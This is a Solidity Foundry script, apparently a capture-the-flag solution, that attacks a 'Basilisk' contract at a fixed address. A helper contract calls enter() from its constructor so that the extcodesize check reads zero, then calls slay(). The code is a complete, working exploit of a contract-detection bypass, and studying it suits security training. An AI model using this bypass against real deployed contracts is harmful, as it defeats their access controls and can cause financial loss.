// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8;

import "forge-std/Script.sol";
import "forge-std/console.sol";

contract AttackBasiliskScript is Script {
    function run() external {
        uint256 privateKey = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(privateKey);
        IBasilisk basilisk = IBasilisk(
            0xDb53eB45761A7B8f4B212eA448879f40f2eFddFC
        );
        require(basilisk.isSlain() == false);
        AttackBasilisk attack = new AttackBasilisk(basilisk);
        attack.slay(basilisk);

        require(basilisk.isSlain() == true);

        vm.stopBroadcast();
    }
}

contract AttackBasilisk {
    constructor(IBasilisk basilisk) {
        // We enter during the constructor to ensure extcodesize(address(this)) == 0
        basilisk.enter();
    }

    function slay(IBasilisk basilisk) external {
        basilisk.slay();
    }

    function challenge() external pure returns (bool) {
        return true;
    }
}

interface IBasilisk {
    function entered(address who) external view returns (bool);

    function isSlain() external view returns (bool);

    function enter() external;

    function slay() external;
}
